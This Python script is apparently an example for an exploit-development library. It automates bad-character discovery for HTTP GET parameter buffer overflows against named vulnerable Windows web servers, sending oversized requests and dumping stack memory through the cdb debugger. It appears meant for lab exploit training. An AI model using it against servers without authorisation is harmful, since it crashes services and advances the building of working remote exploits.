"""
http_get.py  -  Bad char discovery for HTTP GET parameter overflows
====================================================================

Target:   Generic HTTP server with a GET parameter overflow.
          Adjust HOST, PORT, PATH, and PARAM_NAME for your target.

Example targets with HTTP-based overflows:
  - Easy File Sharing Web Server 7.2  (port 80, multiple params)
  - MiniShare 1.4.1                   (port 80, GET request URI)
  - Savant Web Server 3.1             (port 80, GET URI)

This example demonstrates two things:
  1. Using --magic-mode ascii (w00t) for targets sensitive to high bytes.
  2. Adjusting --exclude for HTTP-specific bad chars.

HTTP BAD CHARS
--------------
At minimum exclude: 00 0a 0d
Additional common HTTP bad chars:
  20  (space) - terminates the URI / parameter value
  26  (&)     - parameter separator
  3d  (=)     - key/value separator
  25  (%)     - percent-encoding prefix
  2b  (+)     - space substitute in form encoding

Start with 00,0a,0d,20 and add more if the server mangles bytes.

HIGH-BYTE SENSITIVITY
---------------------
Some HTTP parsers (especially older Win32 ones) apply Unicode or
codepage transformations to bytes > 0x7F. If you see bytes being
transformed to 0x3F (?) or 0xEF 0xBF 0xBD (UTF-8 replacement),
switch to ascii magic:
  magic = MAGIC_ASCII  (b"w00t")
  exclude = (0x00, 0x0a, 0x0d, 0x20, ...)

DUMP EXPRESSION
---------------
For a GET parameter overflow into a stack buffer via strcpy:
  dump_expr = "poi(@esp+4)"   standard cdecl strcpy dst

For servers that use a custom copy (inline or inlined by the compiler):
  You may need to break at a specific address rather than a symbol.
  Use IDA or WinDbg to find the instruction that does the copy,
  set --breakpoint to that address (e.g. 0x00401234),
  set --step none (break immediately after, or at the ret),
  set --dump-expr to the register or stack value holding dst.

HOW TO USE
----------
1. Adjust HOST, PORT, PATH, PARAM_NAME, OFFSET, TOTAL_SIZE.
2. If the server mangles high bytes, set magic = MAGIC_ASCII and add
   the 'w' 'o' 't' bytes (0x77 0x30 0x74) to EXCLUDE if needed.
3. Run:  python http_get.py
"""

import socket
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from badchar_auto import BadCharOrchestrator, Stage, MAGIC_BINARY, MAGIC_ASCII

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 80

# The path and parameter that triggers the overflow.
# payload replaces the value of PARAM_NAME.
HTTP_PATH   = "/vdir/"            # adjust for your target
PARAM_NAME  = "filename"          # adjust for your target

OFFSET     = 1000   # adjust: byte offset within the parameter value to test region
TOTAL_SIZE = 2000   # adjust: total length of the parameter value

CDB_PATH   = r"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe"
TARGET_EXE = r"C:\target\app.exe"   # adjust

# HTTP bad chars. Add more based on what the server normalises.
EXCLUDE = (0x00, 0x0a, 0x0d, 0x20)

# Use ascii magic for targets that mangle high bytes.
# MAGIC_BINARY = b"\xBC\xF0\xBC\xF0"  (default, good for most)
# MAGIC_ASCII  = b"w00t"              (use if high bytes are mangled)
MAGIC = MAGIC_BINARY

# ---------------------------------------------------------------------------
# Protocol sender
# ---------------------------------------------------------------------------

def send_http_get(payload: bytes) -> None:
    """
    HTTP/1.0 GET request. HTTP/1.0 closes the connection after response,
    which simplifies socket handling for crash scenarios.

    The payload is placed as the parameter value. Characters that are
    syntactically significant in URLs (%, &, =, space) should be in
    EXCLUDE if they corrupt the test sequence before reaching the stack.
    """
    param_value = payload

    request = (
        b"GET " +
        HTTP_PATH.encode() +
        b"?" +
        PARAM_NAME.encode() +
        b"=" +
        param_value +
        b" HTTP/1.0\r\n"
        b"Host: " + TARGET_HOST.encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(request)
        try:
            s.recv(4096)
        except Exception:
            pass
    finally:
        s.close()

# ---------------------------------------------------------------------------
# Stage
# ---------------------------------------------------------------------------

STAGE = Stage(
    name       = "http_get_strcpy",
    breakpoint = "msvcrt!strcpy",
    dump_expr  = "poi(@esp+4)",
    dump_size  = 512,
    step_mode  = "pt",
)

# ---------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------

def main() -> int:
    orch = BadCharOrchestrator(
        stage            = STAGE,
        sender           = send_http_get,
        offset           = OFFSET,
        total_size       = TOTAL_SIZE,
        exclude          = EXCLUDE,
        magic            = MAGIC,
        dump_dir         = r"C:\badchar",
        cdb_path         = CDB_PATH,
        target_exe       = TARGET_EXE,
        timeout          = 15,
        restart_on_crash = True,
        restart_delay    = 1.5,
    )

    orch.run_full(max_iterations=30)
    return 0


if __name__ == "__main__":
    sys.exit(main())
